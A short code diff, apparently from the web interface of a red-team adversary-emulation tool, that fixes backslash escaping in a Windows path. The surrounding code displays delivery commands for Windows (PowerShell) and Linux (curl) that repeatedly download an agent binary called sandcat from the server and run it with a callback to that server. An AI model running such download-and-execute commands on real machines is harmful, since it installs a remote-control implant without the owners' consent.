@@ -82,7 +82,7 @@
             let x = $('#delivery-command');
             let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
             if(identity === 'windows') {
-                x.text('while($true){$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output); C:\Users\Public\sandcat.exe -server '+loc+' -group my_group; sleep 60}');
+                x.text('while($true){$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\sandcat.exe -server '+loc+' -group my_group; sleep 60}');
             } else if (identity === 'linux') {
                 x.text('while true; do curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group; sleep 60; done');
             } else if (identity === 'darwin') {
